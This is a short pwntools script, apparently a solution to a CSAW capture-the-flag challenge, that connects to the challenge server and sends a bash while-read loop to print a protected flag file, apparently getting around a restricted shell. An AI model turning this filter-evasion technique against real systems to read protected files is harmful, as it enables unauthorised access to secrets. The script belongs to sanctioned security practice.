#!/usr/bin/env python3
from pwn import *
import re

r = remote('null.ctf.csaw.io', 9191)

r.sendlineafter(b'$ ', b'/home/bin/bash -c \'while IFS= read -r line; do echo "$line"; done < /home/groot/.flag\'')

flag = r.clean(1).strip().decode()

print(re.search(r'csawctf{.+}', flag).group(0))
